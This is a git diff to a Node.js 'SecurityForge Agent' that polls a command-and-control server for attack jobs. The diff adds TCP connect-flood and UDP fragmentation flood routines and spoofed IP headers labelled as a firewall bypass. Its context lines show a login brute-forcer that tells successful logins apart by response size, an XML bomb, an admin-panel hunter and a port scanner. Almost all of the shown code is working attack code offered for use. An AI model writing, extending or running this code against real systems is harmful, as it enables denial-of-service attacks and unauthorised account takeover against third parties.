@@ -1,8 +1,7 @@
 /**
- * SECURITYFORGE AGENT V17.0 (DEEP CRACK)
+ * SECURITYFORGE AGENT V18.0 (STORMBRINGER)
+ * - V18.0: NetJam 2.0 (SYN Flood / Frag Attack) + Login Siege 3.0 (403 Bypass).
  * - V17.0: Baseline Anomaly Detection for 99.9% Login Accuracy. 
- *          Requires 5 'Calibration' fails before starting attack.
- * - V16.4: Zero Trust Logic.
  */
 const https = require('https');
 const http = require('http');
@@ -36,7 +35,7 @@ const JUNK_DATA_SMALL = Buffer.alloc(1024 * 1, 'x');
 
 // --- KEEPALIVE SERVER ---
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V17.0 ACTIVE'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V18.0 ACTIVE'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // --- HELPER: NATIVE SUPABASE ---
@@ -74,7 +73,7 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[35m[AGENT] Initialized V17.0 (Deep Crack). Polling C2...\x1b[0m');
+console.log('\x1b[35m[AGENT] Initialized V18.0 (Stormbringer). Polling C2...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
@@ -132,6 +131,40 @@ const startAttack = (job) => {
         };
         for(let i=0; i<Math.min(job.concurrency, 300); i++) flood();
     }
+    else if (job.use_syn_flood) {
+        // V18: TCP SYN Flood Simulation (Half-Open)
+        const [host, portStr] = job.target.split(':');
+        const port = parseInt(portStr) || 80;
+        const synFlood = () => {
+            if (!running) return;
+            if (!checkMemory()) return setTimeout(synFlood, 50);
+            try {
+                const s = new net.Socket();
+                s.connect(port, host, () => { s.destroy(); }); // Connect and immediately kill
+                s.on('error', () => {}); // Ignore errors, speed is key
+                jobSuccess++; totalRequests++;
+            } catch(e) {}
+            if (running) setImmediate(synFlood);
+        }
+        for(let i=0; i<Math.min(job.concurrency, 500); i++) synFlood();
+    }
+    else if (job.use_frag_attack) {
+        // V18: UDP Fragmentation Attack
+        const [host, portStr] = job.target.split(':');
+        const port = parseInt(portStr) || 80;
+        const frag = () => {
+            if (!running) return;
+            try {
+                const client = dgram.createSocket('udp4');
+                const size = Math.floor(Math.random() * 1400) + 64; // Randomize packet size
+                const buf = Buffer.alloc(size, 'X');
+                client.send(buf, port, host, (err) => { client.close(); });
+                jobSuccess++; totalRequests++;
+            } catch(e) {}
+            if (running) setImmediate(frag);
+        }
+        for(let i=0; i<Math.min(job.concurrency, 500); i++) frag();
+    }
     else if (job.use_admin_hunter) {
         /* ... Admin Hunter Code ... */
         let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
@@ -153,7 +186,6 @@ const startAttack = (job) => {
     else if (job.use_port_scan) {
         /* ... Port Scan Code ... */
         let targetHost = job.target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0];
-        // Clean targetHost if it has path
         if (targetHost.includes('/')) targetHost = targetHost.split('/')[0];
         
         const scanPort = (idx) => {
@@ -241,7 +273,6 @@ const startAttack = (job) => {
                 method = 'POST';
                 // V17.0: CALIBRATION PHASE
                 if (calibrationCount < CALIBRATION_LIMIT) {
-                    // Send GUARANTEED WRONG credentials to learn the failure signature
                     creds = ['admin', 'WRONGPASS_' + Date.now()];
                     body = JSON.stringify({ username: creds[0], password: creds[1] });
                 } else {
@@ -261,16 +292,26 @@ const startAttack = (job) => {
                     }
                 }
             } else if (job.use_goldeneye || job.use_xml_bomb) {
-                // ... stress bodies ...
                 if (job.use_xml_bomb) body = MALICIOUS_PAYLOADS.XML_BOMB;
             }
 
             // Headers setup
             const headers = {
-                'User-Agent': 'SecurityForge/17', 
+                'User-Agent': 'SecurityForge/18', 
                 'Content-Type': 'application/json',
                 ...((typeof job.headers === 'string' ? {} : job.headers) || {})
             };
+            
+            // V18.0: WAF BYPASS HEADERS
+            if (job.use_login_siege || job.use_chaos) {
+                headers['X-Forwarded-For'] = '127.0.0.1';
+                headers['X-Originating-IP'] = '127.0.0.1';
+                headers['X-Remote-IP'] = '127.0.0.1';
+                headers['X-Remote-Addr'] = '127.0.0.1';
+                headers['X-Client-IP'] = '127.0.0.1';
+                headers['X-Host'] = '127.0.0.1';
+                headers['X-Forwarded-Host'] = '127.0.0.1';
+            }
             
             // Chaos Vortex Headers
             if (job.use_chaos) {
@@ -289,17 +330,14 @@ const startAttack = (job) => {
                      res.on('end', () => {
                          const bodyLen = res.headers['content-length'] ? parseInt(res.headers['content-length']) : responseBody.length;
                          
-                         // Phase 1: Calibration
                          if (calibrationCount < CALIBRATION_LIMIT) {
-                             if (baselineLength === -1 || bodyLen > 0) baselineLength = bodyLen; // Determine fail size
+                             if (baselineLength === -1 || bodyLen > 0) baselineLength = bodyLen; 
                              calibrationCount++;
                              return;
                          }
 
-                         // Phase 2: Anomaly Detection
-                         // If size is drastically different from baseline, it's a hit.
                          const sizeDiff = Math.abs(bodyLen - baselineLength);
-                         const isAnomaly = sizeDiff > (baselineLength * 0.15) + 50; // >15% difference + buffer
+                         const isAnomaly = sizeDiff > (baselineLength * 0.15) + 50;
 
                          const isRedirect = (res.statusCode === 301 || res.statusCode === 302);
                          const isLoginRedirect = res.headers.location?.includes('login') || res.headers.location?.includes('error');
@@ -308,11 +346,9 @@ const startAttack = (job) => {
 
                          if (isRedirect && !isLoginRedirect) isBypass = true;
                          else if (res.statusCode === 200) {
-                             // Check for JSON success tokens
                              if (responseBody.includes('"success":true') || responseBody.includes('"token":') || responseBody.includes('"auth":true')) {
                                  isBypass = true;
                              } else if (isAnomaly && !responseBody.includes('error') && !responseBody.includes('fail')) {
-                                 // Size is different AND no error keywords -> Likely success
                                  isBypass = true;
                              }
                          }
@@ -325,7 +361,6 @@ const startAttack = (job) => {
                          }
                      });
                  } else {
-                     // Standard Stress
                      if (res.statusCode < 500) jobSuccess++; else jobFailed++;
                      res.resume(); 
                  }
